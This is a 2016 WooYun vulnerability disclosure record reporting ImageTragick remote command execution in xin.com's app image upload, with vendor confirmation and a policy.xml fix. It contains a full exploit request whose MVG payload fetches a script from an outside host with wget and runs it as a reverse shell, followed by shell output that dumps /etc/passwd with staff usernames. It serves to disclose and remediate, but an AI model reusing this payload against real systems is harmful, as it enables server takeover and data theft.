{"id": 88023, "wybug_id": "wooyun-2016-0206489", "wybug_title": "优信二手车官方app命令执行                                      ", "wybug_corp": "xin.com", "wybug_author": "jianFen", "wybug_date": "2016-05-08 20:52", "wybug_open_date": "2016-06-23 15:20", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-23：\t细节向公众公开  简要描述： - - 详细说明：  下载官方app后 头像处抓包 上传看左上角的旋转图片 哈\n\n\nPOST /upload.php HTTP/1.1Connection: Keep-AliveUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)Content-Type: multipart/form-data; boundary=---------------------------123821742118716Host: imgup.xin.comAccept-Encoding: gzipContent-Length: 300217-----------------------------123821742118716Content-Disposition: form-data; name=\"app\"xin_app-----------------------------123821742118716Content-Disposition: form-data; name=\"key\"RdUAb6GF6uWjqW-----------------------------123821742118716Content-Disposition: form-data; name=\"pic\"; filename=\"crop.png\"Content-Type:image/pngpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|wget 115**02/back.py -O /tmp/x.py && python /tmp/x.py 115.**202 2333\")'pop graphic-context-----------------------------123821742118716--\n图片内容\npush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|wget 115****202/back.py -O /tmp/x.py && python /tmp/x.py 1****.202 2333\")'pop graphic-context\n\nsh-4.1$ pwdpwd/data1/webapps/imgup.xin.com/htdocs\n\nsh-4.1$ uname -auname -aLinux d1601085.grid.nc.xin.com 2.6.32-573.el6.x86_64 #1 SMP Thu Jul 23 15:44:03 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n   漏洞证明：  \nsh-4.1$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologindingning:x:1001:1001:dingning,,,:/home/dingning:/bin/bashchenwei:x:1003:1003:chenwei,,,:/home/chenwei:/bin/bashsongqipeng:x:1002:1002:songqipeng,,,:/home/songqipeng:/bin/bashchenlimin:x:1004:1004:chenlimin,,,:/home/chenlimin:/bin/bashchenkun:x:1005:1005:chenkun,,,:/home/chenkun:/bin/bashzhoujiangjun:x:1006:1006:zhoujiangjun,,,:/home/zhoujiangjun:/bin/bashnginx:x:510:510::/home/nginx:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinliuxiaopeng:x:1007:1007:liuxiaopeng,,,:/home/liuxiaopeng:/bin/bashhoupengfei:x:1008:1008:houpengfei,,,:/home/houpengfei:/bin/bash\n   修复方案：  官方在6.9.3-9版本中对漏洞进行了不完全的修复使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：<policymap><policy domain=\"coder\" rights=\"none\" pattern=\"EPHEMERAL\" /><policy domain=\"coder\" rights=\"none\" pattern=\"URL\" /><policy domain=\"coder\" rights=\"none\" pattern=\"HTTPS\" /><policy domain=\"coder\" rights=\"none\" pattern=\"MVG\" /><policy domain=\"coder\" rights=\"none\" pattern=\"MSL\" /></policymap>   版权声明：转载请注明来源 jianFen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-05-09 15:16 厂商回复： 非常感谢，已经确认漏洞存在！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}